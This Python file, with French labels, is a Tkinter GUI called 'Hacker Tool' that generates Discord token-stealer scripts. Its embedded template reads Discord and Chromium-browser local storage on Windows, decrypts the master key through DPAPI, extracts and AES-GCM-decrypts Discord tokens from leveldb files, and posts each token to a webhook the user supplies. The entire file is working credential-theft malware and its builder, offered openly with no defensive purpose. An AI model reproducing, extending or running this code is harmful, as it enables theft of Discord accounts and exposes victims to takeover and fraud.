import tkinter as tk
from tkinter import messagebox, filedialog

BG_COLOR = "#000000"
FG_COLOR = "#00FF00"
FONT = ("Consolas", 11)

# Modèle du script Python token grabber avec un placeholder {webhook}
PYTHON_TEMPLATE = '''\
import os
import json
import base64
import re
import sys
import requests
from Crypto.Cipher import AES
import win32crypt

WEBHOOK_URL = "{webhook}"

PATHS = {{
    'Discord': os.getenv("APPDATA") + '\\\\discord',
    'Discord Canary': os.getenv("APPDATA") + '\\\\discordcanary',
    'Lightcord': os.getenv("APPDATA") + '\\\\Lightcord',
    'Discord PTB': os.getenv("APPDATA") + '\\\\discordptb',
    'Chrome': os.getenv("LOCALAPPDATA") + '\\\\Google\\\\Chrome\\\\User Data\\\\Default',
    'Brave': os.getenv("LOCALAPPDATA") + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',
    'Edge': os.getenv("LOCALAPPDATA") + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Default',
}}

def get_encryption_key(path):
    try:
        with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key
    except Exception:
        return None

def find_encrypted_tokens(path):
    tokens = []
    leveldb_path = os.path.join(path, "Local Storage", "leveldb")
    if not os.path.exists(leveldb_path):
        return tokens
    for filename in os.listdir(leveldb_path):
        if not filename.endswith((".log", ".ldb")):
            continue
        try:
            with open(os.path.join(leveldb_path, filename), "r", errors="ignore") as f:
                for line in f:
                    found = re.findall(r'dQw4w9WgXcQ:[^\\"]+', line)
                    tokens.extend(found)
        except Exception:
            continue
    return tokens

def decrypt_token(enc_token, key):
    try:
        token_bytes = base64.b64decode(enc_token.split('dQw4w9WgXcQ:')[1])
        iv = token_bytes[3:15]
        payload = token_bytes[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)[:-16]
        return decrypted.decode()
    except Exception:
        return None

def send_token_via_webhook(token):
    data = {{
        "content": f"Token Discord récupéré : `{{token}}`"
    }}
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        return response.status_code == 204
    except Exception:
        return False

def main():
    found_tokens = []
    for name, path in PATHS.items():
        if not os.path.exists(path):
            continue
        key = get_encryption_key(path)
        if not key:
            continue
        encrypted_tokens = find_encrypted_tokens(path)
        for enc_token in encrypted_tokens:
            token = decrypt_token(enc_token, key)
            if token and token not in found_tokens:
                found_tokens.append(token)
                sent = send_token_via_webhook(token)
                print(f"Token envoyé via webhook: {{token}} - Succès: {{sent}}")

if __name__ == "__main__":
    if os.name == "nt":
        main()
'''

class HackerTool(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Hacker Tool - Générateur Python Token Stealer")
        self.geometry("700x250")
        self.configure(bg=BG_COLOR)

        tk.Label(self, text="Entrez votre Webhook Discord :", bg=BG_COLOR, fg=FG_COLOR, font=FONT).pack(pady=10)
        self.webhook_entry = tk.Entry(self, bg=BG_COLOR, fg=FG_COLOR, font=FONT, width=90, insertbackground=FG_COLOR)
        self.webhook_entry.pack()

        self.gen_btn = tk.Button(self, text="Générer script Python", bg=BG_COLOR, fg=FG_COLOR, font=FONT, command=self.generate_script)
        self.gen_btn.pack(pady=25)

        self.status_label = tk.Label(self, text="", bg=BG_COLOR, fg=FG_COLOR, font=FONT)
        self.status_label.pack()

    def generate_script(self):
        webhook = self.webhook_entry.get().strip()
        if not webhook.startswith("https://discord.com/api/webhooks/"):
            messagebox.showerror("Erreur", "Webhook Discord invalide.")
            return

        script_code = PYTHON_TEMPLATE.format(webhook=webhook)

        filename = filedialog.asksaveasfilename(defaultextension=".py",
                                                filetypes=[("Fichiers Python", "*.py")],
                                                title="Enregistrer le script Python")
        if not filename:
            return

        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write(script_code)
            self.status_label.config(text=f"Script généré et sauvegardé : {filename}")
            messagebox.showinfo("Succès", "Script Python généré avec succès !")
        except Exception as e:
            messagebox.showerror("Erreur", f"Impossible d'écrire le fichier.\n{e}")

if __name__ == "__main__":
    app = HackerTool()
    app.mainloop()
